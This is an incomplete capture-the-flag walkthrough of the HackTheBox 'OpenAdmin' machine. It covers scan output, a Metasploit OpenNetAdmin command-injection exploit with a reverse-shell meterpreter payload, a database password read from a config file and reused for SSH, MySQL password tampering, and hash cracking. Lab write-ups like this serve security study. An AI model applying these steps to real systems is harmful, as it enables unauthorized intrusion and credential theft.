
# OpenAdmin <!-- omit in toc -->

# Table of Contents <!-- omit in toc -->
- [Scan Results](#scan-results)
  - [Nmap](#nmap)
    - [Ports](#ports)
  - [Directories](#directories)
- [Recon](#recon)
- [Expolit](#expolit)
    - [Metasploit:](#metasploit)
- [Post Exploit](#post-exploit)
- [Flags](#flags)
    - [User Flag](#user-flag)
    - [Root Flag](#root-flag)

# Scan Results

## Nmap
```
# Nmap 7.80 scan initiated Wed Mar 11 12:59:27 2020 as: nmap -sV -sC -oA ./Documents/HackTheBox/OpenAdmin/Scans/nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.087s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 11 12:59:38 2020 -- 1 IP address (1 host up) scanned in 11.27 seconds
```
### Ports
* 22 - ssh
* 80 - http

## Directories
```
root@kali:~# gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 13:05:20 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2020/03/11 13:38:25 Finished
===============================================================
```
# Recon

# Expolit

### Metasploit:

1. open metasploit using: `msfconsole`
2. search for opennetadmin
3. use `exploit/unix/webapp/opennetadmin_ping_cmd_injection`
4. set payload to `linux/x64/meterpreter/reverse_tcp)`
5. set `RHOSTS` and `LHOSTS`


there are 2 users on the machine: jimmy, joanna

using the docs we can see how to install.
logs are created at: /var/log/ona.log
config: /opt/ona/www/local/config

Go to the config folder there we see 3 files:
```
meterpreter > ls
Listing: /opt/ona/www/local/config
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  426   fil   2019-11-22 17:18:18 +0000  database_settings.inc.php
100664/rw-rw-r--  1201  fil   2019-11-22 17:18:18 +0000  motd.txt.example
100644/rw-r--r--  0     fil   2019-11-22 17:18:18 +0000  run_installer

```

cat the database_settings file:
```
meterpreter > cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```

we found the database login info.

ssh as jimmy using the database password
```
ssh jimmy@10.10.10.171
```

and now connect to the mysql database using:
```
mysql -u ona_sys -p
```

when asked for password, enter the password we found above.
commands:
```
show databases;
use [database name];
show tables;
select * from [table];
show columns from [table];
update users set password = 'admin' where id =2;
```

once connected as jimmy go to: `/var/www/internal`
there are 3 files which we can donwload for inspection
```
scp jimmy@10.10.10.171:/var/www/internal/index.php ./Desktop/

scp jimmy@10.10.10.171:/var/www/internal/main.php ./Desktop/

scp jimmy@10.10.10.171:/var/www/internal/logout.php ./Desktop/
```

on the index.php file we can see the following SHA512 password:

```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
```

using SHA512 dyrcpter the password is: `Revealed`

to get to the files we need to start a php server on the /var/www/internal folder
```
php -S 10.10.10.171:8080
```

now browse to 10.10.10.171:8080 and interact with the files.
the user is: `jimmy`
password: `Revealed`

now main.php should cat joanna's rsa key but running the php server as jimmy shows us Permission denied


# Post Exploit

# Flags

### User Flag

### Root Flag

